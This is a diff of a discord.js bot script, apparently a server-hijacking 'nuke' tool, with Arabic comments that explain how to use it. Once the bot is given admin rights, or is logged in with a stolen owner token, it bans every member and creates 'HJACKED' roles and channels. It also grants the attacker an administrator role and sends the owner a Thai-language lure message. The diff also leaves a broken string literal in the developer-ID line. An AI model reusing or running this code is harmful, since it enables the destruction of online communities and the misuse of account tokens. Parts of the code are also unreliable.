@@ -1,3 +1,16 @@
+//فكره الكود
+//ان تسوي بوت 
+//وتعطيه اداري يضيفه
+//لما يضيفه تكتب الامر يلي انت حددته
+//وبيسوي رتب باسم يلي انت تحدده
+//ورومات صوتيه وكتابيه بالاسم يلي تحدده
+//ويعطيك رتبه فيها ادمن ستريشن
+//وتتحكم في السيرفر 
+//طبعا اول ما تكتب الامر بيبند كل الاعضاء 
+//او
+// اذا معك توكن الاونر حط توكن الاونر
+//ENJOY
+//Sorry For The Bad Engilsh :/
 //By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
@@ -12,15 +25,32 @@ const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
 const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
 const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
 const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
+console.log('BY OROCHIX');
+console.log('Start Hacking System ..')
+client.on('ready', () => {
+  console.log(`Logged in as ${client.user.tag} !`);
+  console.log(`Done The Hacking System Has Been Started`)
+
+});
+client.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
+//BY OROCHIX (Arabic)
+        
+
 });
 // ban all and send a message for the ownerserver
 async function nuke(guild) {
-    let users = 10000;
-    let channels = 10000;
+    let users = 100;
+    let channels = 100;
   
     await guild.fetchMembers();
   
-    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [ https://discord.gg/5SbFP2k ]').catch(e => { return void e; });
+    await guild.owner.send('ยินดีด้วยค่ะ คุณคือผู้โชคดี [  ]').catch(e => { return void e; });
   
   
   
@@ -447,7 +477,7 @@ let me = message.author
 
 //login in to the bot token or the serverowner token
     client.on('message', async message => {
-  const devs = ['286143114878517248']; // your id
+  const devs = ['];
   let member = message.author
    if (message.content === opcmd) {
     if (!devs.includes(message.author.id)) return;
